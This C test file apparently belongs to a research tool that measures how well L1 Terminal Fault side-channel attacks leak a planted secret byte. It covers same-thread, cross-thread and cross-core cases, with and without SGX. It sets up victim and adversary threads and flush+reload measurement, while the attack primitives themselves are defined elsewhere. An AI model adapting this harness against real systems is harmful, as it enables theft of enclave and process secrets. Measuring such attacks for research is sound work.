#include "enclyser/app/l1tf.h"

#pragma region l1tf

TestSuite(l1tf, .init = construct_app_environment, .fini = destruct_app_environment);

#pragma region same_thread_l1tf_nosgx_is_10_percent_effective

/**
 * @brief Test if same_thread_l1tf_nosgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_l1tf_nosgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            fill_lfb(app_filling_sequence, &encalve_secret_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, same_thread_l1tf_nosgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    // assign_enclyser_buffer(&encalve_secret_buffer);
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region same_thread_l1tf_sgx_is_10_percent_effective // FIXME

/**
 * @brief Test if same_thread_l1tf_sgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_l1tf_sgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, same_thread_l1tf_sgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_l1tf_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_l1tf_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_thread_l1tf_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_sgx_is_1_percent_effective // FIXME

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        // ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_l1tf_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_l1tf_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_l1tf_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_l1tf_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_thread_l1tf_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_l1tf_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_l1tf_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_l1tf_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_l1tf_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_core_l1tf_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_l1tf_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &app_attaking_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_l1tf_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_l1tf_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_l1tf_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_l1tf_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_l1tf_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_core_l1tf_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_l1tf_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma endregion
